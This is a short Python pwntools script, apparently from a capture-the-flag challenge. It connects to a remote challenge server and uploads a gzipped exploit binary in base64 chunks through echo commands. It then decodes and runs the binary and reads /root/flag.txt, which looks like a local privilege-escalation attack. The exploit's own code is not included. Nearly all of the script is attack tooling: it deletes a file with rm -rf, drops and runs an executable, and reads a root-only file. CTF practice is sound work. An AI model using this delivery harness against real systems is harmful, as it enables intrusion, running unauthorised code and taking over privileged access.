from base64 import b64encode
from os import popen
from pwn import *

b64payload = popen("base64 < rootfs/exploit_upx.gz").read()
b64payload = b64payload.split("\n")
pause()
context.log_level = 'debug'
io = remote("chall-hk.pwnable.hk",20002)

io.sendlineafter(b"/ $ ",b"rm -rf /home/ctf/b64payload ; touch /home/ctf/b64payload")
for line in b64payload:
    assert("\n" not in line)
    io.sendline(f"echo \"{line}\" >> /home/ctf/b64payload".encode())

io.clean(timeout=1)

io.sendline(b"base64 -d < /home/ctf/b64payload > /home/ctf/exp.gz")
io.sendline(b"cd /home/ctf/ ; gzip -d exp.gz ; chmod +x exp ; ./exp")
io.sendline(b"cat /root/flag.txt")

io.interactive()